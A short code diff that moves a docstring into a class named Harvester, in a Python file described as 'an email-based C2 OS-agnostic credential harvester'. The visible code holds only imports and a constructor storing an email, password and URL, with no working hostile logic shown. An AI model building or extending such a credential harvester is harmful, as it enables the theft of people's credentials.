@@ -1,7 +1,4 @@
 #!/usr/bin/env python3
-"""
-An email-based C2 OS-agnostic credential harvester.
-"""
 import requests
 import subprocess
 import smtplib
@@ -9,6 +6,9 @@ import os
 import tempfile
 
 class Harvester:
+    """
+    An email-based C2 OS-agnostic credential harvester.
+    """
     def __init__(self, email, password, url):
         self.email = email
         self.password = password
